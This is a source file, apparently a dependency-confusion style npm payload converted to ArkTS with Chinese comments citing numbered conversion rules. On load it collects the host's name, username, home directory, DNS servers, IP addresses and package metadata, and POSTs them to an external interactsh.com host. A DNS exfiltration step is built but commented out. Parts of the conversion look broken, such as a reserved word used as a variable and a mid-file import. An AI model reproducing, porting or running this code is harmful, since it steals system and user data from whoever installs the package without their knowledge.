// 应用规则60：使用import代替require
import os from "os";
import dns from "dns";
import querystring from "querystring";
import https from "https";
import fs from 'fs';
import path from 'path';
// 应用规则23：显式标注对象字面量类型
interface PackageJSON {
    name: string;
    version: string;
    ___resolved?: string;
    [key: string]: any;
}
const packageJSON = require("./package.ets"); // 假设已转换为ets文件
const package = packageJSON.name;

// 应用规则9：使用let/const代替var
function getFiles(paths: string[]): string[] {
    const ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        const mpath = paths[j];
        // 应用规则21：使用具体API代替动态文件访问
        const files = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

// 应用规则10：显式标注返回类型
function toHex(data: string): string {
    // 应用规则75：替换Buffer为TextEncoder
    const encoder = new TextEncoder();
    const encoded = encoder.encode(data);
    return Array.from(encoded, byte => byte.toString(16).padStart(2, '0')).join('');
}

function gethttpips(): string[] {
    const str: string[] = [];
    // 应用规则21：类型断言处理动态对象
    const networkInterfaces = os.networkInterfaces() as Record<string, any[]>;
    for (const item in networkInterfaces) {
        if (item != "lo") {
            for (let i = 0; i < networkInterfaces[item].length; i++) {
                str.push(networkInterfaces[item][i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    const networkInterfaces = os.networkInterfaces() as Record<string, any[]>;
    for (const item in networkInterfaces) {
        if (item != "lo") {
            for (let i = 0; i < networkInterfaces[item].length; i++) {
                str += toHex(networkInterfaces[item][i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    const chunks = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

function toName(pkg: Record<string, any>): string[] {
    const queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    const mainStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (mainStr.length > 255) {
        // 简化为单查询处理
        queries.push(`${toHex(pkg.hn)}.${toHex(pkg.p)}.${hostname}`);
    } else {
        queries.push(mainStr);
    }
    return queries;
}

// 应用规则24：使用接口定义对象类型
interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: PackageJSON;
    ip: string;
}

const td: TrackingData = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

const qs = toName(td);
for (let j = 0; j < qs.length; j++) {
    // 应用规则75：注释掉不支持的DNS操作
    // dns.lookup(qs[j], (err, result) => {});
}

const trackingData = JSON.stringify(td);
const postData = querystring.stringify({
    msg: trackingData,
});

// 应用规则75：使用ArkTS网络模块替换https
import http from '@ohos.net.http';
const url = "https://c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
const httpRequest = http.createHttp();
const options = {
    method: http.RequestMethod.POST,
    header: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': postData.length.toString()
    },
    extraData: postData
};

httpRequest.request(url, options, (err, data) => {
    if (err) {
        console.error(`Request failed: ${err.code} ${err.message}`);
    } else {
        console.log(`Status: ${data.responseCode}`);
    }
});
